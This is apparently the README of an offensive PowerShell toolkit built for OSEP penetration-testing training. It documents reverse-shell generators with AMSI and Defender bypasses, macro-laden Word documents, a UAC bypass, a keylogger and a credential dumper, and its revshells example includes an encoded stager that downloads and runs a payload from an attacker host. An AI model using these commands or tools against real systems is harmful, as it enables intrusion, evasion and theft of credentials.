# PoorMansArmory
Originally developed for [OSEP](https://www.offsec.com/courses/pen-300/), this repository offers a wide collection of robust and versatile tools.  One goal was to prioritize verbosity, user-friendliness, and compatibility while serving as a powerful (and educational) resource.

**The tools included range from...**
- Malleable reverse shell generation w/ optional SSL support, AMSI bypasses, self-signed certificate bypasses, etc.
- Full automation of template injecting and/or macro infesting Office Word documents.
- Intuitive lateral file transfers over HTTPS via self-signed certificates.
- Robust service enumeration (e.g., unquoted service path detection & auditing, service binary ACLs).
- Educational Proof-of-Concept payloads (e.g., PowerShell keylogger with built-in exfiltration).
- etc., etc., etc.



```
                                         _ _
                                        | | |    ____  __  __      _     
                                        | | |   |  _ \|  \/  |    / \     
Mom: "We have Sick Scripts™ at home!"   | | |   | |_) | |\/| |   / _ \    
The Sick Scripts™ at Home:              | | |   |  __/| |  | |_ / ___ \ _ 
                                        | | |   |_| (_)_|  |_(_)_/   \_(_) 
                                        |_|_|
```


## Table of Contents <a name="tableContents"></a>
1. [**Import-PMA.ps1**](#importPMA)
2. [**pma_server.py**](#pmaServer)
    - [**Working with WebClientHelpers**](#webClientHelpers)
    - [**Advanced Example**](#advancedExample)
3. [**revshells**](#revshells)
    - [**Get-RevShell.ps1**](#getRevShell)
    - [**Get-Stager.ps1**](#getStager)
4. [**officemacros**](#officemacros)
    - [**Get-MacroInfestedWordDoc.ps1**](#macroDoc)
    - [**Get-TemplateInjectedPayload.ps1**](#templateInject)
5. [**privesc**](#privesc)
    - [**Enum-Services.ps1**](#enumServices)
    - [**Invoke-FodHelperUACBypass.ps1**](#fodHelper)
6. [**misc**](#misc)
    - [**Helpers**](#helpers)
    - [**Proof-of-Concept**](#poc)
    - [**Educational**](#educational)
7. [**License**](#license)

---

> [!IMPORTANT]
> Below is a personal to-do list before I am content with this repository...
> - Adjust scripts to avoid Write-Host for revshell compatibility.
> - Refine the Get-Help messages in ``officemacros``.
> - Overhaul the README.md
> - Fix the logic in ``Enum-Services.ps1`` when using '-FullControl'.
---
    

## 1. Import-PMA.ps1 <a name="importPMA"></a>
This is a simple script to import the primary **PoorMansArmory** scripts into the current session,
while ignoring the less important ones (i.e., ``misc``, ``officemacros/lib``).

**Syntax:**
```powershell
. ./Import-PMA.ps1
```
![Import-PMA.ps1](https://cdn.discordapp.com/attachments/855920119292362802/1156693253626798120/image.png?ex=6515e609&is=65149489&hm=b9e8066b734d9e4e4e2c43acd2664ed4c340006e1268916c5b3a9d05362a1f80&)



## 2. pma_server.py <a name="pmaServer"></a>
```
# Synopsis:
# Simple Flask web server for bi-directional file transfers, supporting
# both HTTP and HTTPS using self-signed certificates.  Intended to be
# used with the PowerShell WebClient helper script(s).

# Parameters:
# --directory <string>  (default: ./uploads)
# --port <int>          (default: 80)
# --ssl                 (default: false)
# --debug               (default: false)
# --help
```

![pma_server](https://cdn.discordapp.com/attachments/855920119292362802/1156685487151530085/image.png?ex=6515dece&is=65148d4e&hm=270a1d232abd1ae53c1396ee6e0b5c47bc8bae45f2b0bc8c19ce908d4e4d442b&)

[**``Return to Table of Contents``**](#tableContents)


### Working with WebClientHelpers <a name="webClientHelpers"></a>

Optional "WebClientHelpers" can be added to either the reverse shell or into a session, adding ``download``,
``upload``, and ``import`` functionality, allowing seemlessly communication with the ``pma_server.py`` web
server for lateral file transfers. The``import`` fuctionality specifically will attempt to remotely load 
hosted files into the session.  If the filename ends with ``.dll`` or ``.exe``, the function will attempt 
.NET reflection. Otherwise, the function will attempt to load the file assuming it contains PowerShell code.
- Using the **-WebClientHelpers** or **-WebClientHelpersURL <url>** parameters with ``Get-RevShell.ps1`` will incorporate them into the reverse shell payload.
- Using ``Load-WebClientHelpers.ps1`` can retro-actively load them into the current session using Global scopes.

**Functions TL;DR:**
- ``download``	-->	Download files hosted on the PMA server
- ``upload``    -->	Upload files to the PMA server
- ``import``	-->	Load PowerShell files and C# binaries into the session

[**``Return to Table of Contents``**](#tableContents)


### Advanced Example <a name="advancedExample"></a>

![Advanced Example](https://cdn.discordapp.com/attachments/855920119292362802/1156680964861341816/image.png?ex=6515da98&is=65148918&hm=7f407b06378a9e22c8e0e6bc3b4d4b920644ba53fd6e62491e5a7bca08cc3a24&)

1. Launch ``pma_server.py`` to listen over port 443.
2. Set up an SSL revshell listener on port 53.
3. Execute advanced ``Get-RevShell.ps1`` payload on the victim (that includes the **-WebClientHelpers** parameter).
4. Use WebClient helpers to upload and import file(s) (this example includes .NET reflection).
5. See files laterally moving on the ``pma_server.py``.
6. Set up a second listener on port 80.
7. Execute the ``SharpShell.dll`` PoC via .NET reflection.
8. Successful ``SharpShell`` execution.

[**``Return to Table of Contents``**](#tableContents)


## 2. revshells <a name="revshells"></a>
This directory contains scripts intended for advanced, robust reverse shell generation. They have been
tested and built to work in both Linux and Windows Environments (i.e., **PowerShell** and **PowerShell Core / pwsh**),
and default to PowerShell 5.0 payloads, but can be toggled to support PowerShell 2.0.

```powershell
# pwsh
PS /opt/PoorMansArmory> Get-RevShell <attacker_ip> <listening_port> -SSL -AmsiBypass -WebClientHelpers > ./uploads/revshell
PS /opt/PoorMansArmory> Get-Stager -PayloadURL "http(s)://<ip_addr>/revshell"
powershell -nop -ex bypass -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4
ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwACgAcwApADoALwAvADwAaQBwAF8AYQBkAGQAcgA+AC8AZAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=
```

**Above example creates a reverse shell payload that...**

1. Is encrypted over self-signed SSL certificates
2. Includes an AMSI bypass
3. Has "WebClientHelpers" built-in
4. Is output to the ``./uploads`` directory that is served by ``pma_server.py``
5. Has a stager (or cradle) created pointing to that payload.

[**``Return to Table of Contents``**](#tableContents)


### ``Get-RevShell.ps1`` <a name="getRevShell"></a>
```
# Synopsis:
# Modular, robust custom reverse shell generator with randomly generated variables
# that can bypass Windows Defender, provide seemless encryption, and have built-in
# tools for intuitive lateral file tranfers.
# 
# Parameters:
#    Main Functionality
#      -IPAddress             -->   Attacker IP address (required)
#      -Port                  -->   Attacker listening port (required)
#      -Raw                   -->   Return reverse shell payload in cleartext rather than base64
#      -Help                  -->   Return Get-Help information
#
#    Modular Options
#      -AmsiBypass            -->   Disable AMSI in current session (validated: 26SEP2023)
#      -SSL                   -->   Encrypt reverse shell via SSL with self-signed certificates
#      -HttpsBypass           -->   Disable HTTPS self-signed certificate checks in the session
#      -B64Reflection         -->   Reflects a static Base64 string of 'SSC.dll' instead of using Add-Type in the payload
#      -PowerShell2Support    -->   Adjust the reverse shell payload to support PowerShell 2.0
#      -Headless              -->   Create reverse shell payload without '-nop -ex bypass -wi h' parameters
#      -Verbose               -->   Make reverse shell variables descriptive instead of randomly generated
#
#    PMA Server Compatibility (Static)
#      -WebClientHelpers      -->   Add WebClientHelpers ('download','upload','import') into the revshell, pointing to the revshell IP address
#      -RemoteReflection      -->   Remotely reflect 'SSC.dll' from the revshell IP address instead of using Add-Type in the payload
#
#    PMA Server Compatibility (Specified)
#      -RemoteReflectionURL   -->   Specific URL hosting 'SSC.dll' to reflect (e.g., 'http(s)://<ip_addr>/SSC.dll')
#      -WebClientHelpersURL   -->   Specific URL of 'pma_server.py' to point WebClientHelpers to (e.g., 'http(s)://<ip_addr>')
```
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)


### ``Get-Stager.ps1`` <a name="getStager"></a>
```
# Synopsis:
# Simple PowerShell stager generator to point to web hosted payloads or commands.
# 
# Parameters:
#   -PayloadURL  -->  URL pointing to the reverse shell payload
#   -Command     -->  PowerShell command to execute instead of a reverse shell stager
#   -Raw         -->  Return stager payload in cleartext rather than base64
#   -Headless    -->  Create stager payload without '-' parameters
#   -Help        -->  Return Get-Help information
```
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)


### Example below 



[**``Return to Table of Contents``**](#tableContents)


## 3. officemacros <a name="officemacros"></a>
Overview here.

[**``Return to Table of Contents``**](#tableContents)

### ``Get-MacroInfestedWordDoc.ps1`` <a name="macroDoc"></a>
```
# Synopsis:
# Generate Macro Infested Word 97-2003 Documents (.doc)
# 
# Parameters:
#   -DocumentName   -->  Name of the malicious Word Document (.doc)
#   -PayloadURL     -->  URL of the hosted payload that the macro points to
#   -MacroContents  -->  Advanced: User input macro instead of the generated one
#   -Help           -->  Return Get-Help information
```
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)


### ``Get-TemplateInjectedPayload.ps1`` <a name="templateInject"></a>
```
# Synopsis:
# TBA
# 
# Parameters:
#   -TemplateURL    -->  URL of the malicious Word Template (.dotm) being hosted
#   -PayloadURL     -->  URL of the hosted payload that the macro points to
#   -Document       -->  Advanced: Target templated Word Document (.docx) to inject
#   -MacroContents  -->  Advanced: User input macro instead of the generated one
#   -Help           -->  Return Get-Help information
```
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)


## 4. privesc <a name="privesc"></a>
Overview here.

[**``Return to Table of Contents``**](#tableContents)


### ``Enum-Services.ps1`` <a name="enumServices"></a>
```
# Synopsis:
# Enumeration script developed to easily parse the Access Control Lists (ACLs) and other parameters
# of Windows Services, such as the service owner, start mode, and whether the service path is vulnerable
# to an unquoted service path attack.  Unquoted service paths are able to be audited for writeability
# via the '-Audit' parameter.
#
# By default the script will return an object containing sorted service binary ACLs.
# 
# Parameters:
#   -StartMode      -->  Services with specified start modes (e.g., 'Auto','Disabled','Manual')
#   -UnquotedPaths  -->  Services containing spaces in their paths but not wrapped in quotations
#   -Audit          -->  Test if vulnerable portions of the unquoted path are writeable for the current user
#   -Owner          -->  Services belonging to specified Owner (e.g., 'SYSTEM')
#   -FullControl    -->  Services with FullControl access rights for specified group (e.g., 'Administrators')
#   -OnlyPath       -->  Return full service paths instead of ACL's
#   -Help           -->  Return Get-Help information
```
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)


### ``Invoke-FodHelperUACBypass.ps1`` <a name="fodHelper"></a>
```
# Synopsis:
# Privilege esclation script developed to exploit the 'fodhelper.exe' UAC bypass,
# with moderate validation built in (e.g., session is 64-bit, current user is in
# the Local Administrators group).
# 
# Parameters:
#   -Payload  -->  Command to execute when 'fodhelper.exe' is executed.
#   -Help     -->  Return Get-Help information
```
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)


## 5. misc <a name="misc"></a>
Overview here.

[**``Return to Table of Contents``**](#tableContents)

### Helpers <a name="helpers"></a>
- This includes `SSC.dll` and `Load-WebClientHelpers.ps1`
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)

### Proof-of-Concept (PoC) <a name="poc"></a>
- This includes the `Capture-Keys.ps1` keylogger, `Get-WifiCredentials.ps1` dumper, `Execute-As.ps1` script, and `SharpShell.dll`.
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)

### Educational <a name="educational"></a>
- This includes `Invoke-RevShellSSL.ps1`, `Invoke-SharpShell.ps1`, and `Bypass-ExecPolicy.ps1`.
- Pretty pictures here.

[**``Return to Table of Contents``**](#tableContents)

---

# License <a name="license"></a>

- [GNU General Public License v3.0](/LICENSE)

